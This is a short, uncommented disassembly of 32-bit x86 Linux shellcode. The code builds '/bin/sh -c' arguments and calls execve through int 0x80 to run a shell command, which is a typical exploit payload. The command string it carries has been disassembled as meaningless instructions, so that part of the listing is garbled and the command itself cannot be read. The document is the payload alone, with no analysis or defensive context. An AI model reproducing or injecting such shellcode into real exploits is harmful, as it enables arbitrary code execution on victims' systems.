push byte +0xb
pop eax
cdq
push edx
push word 0x632d
mov edi,esp
push dword 0x68732f
push dword 0x6e69622f
mov ebx,esp
push edx
call dword 0x21
jo 0x96
add [fs:edi+0x53],dl
mov ecx,esp
int 0x80
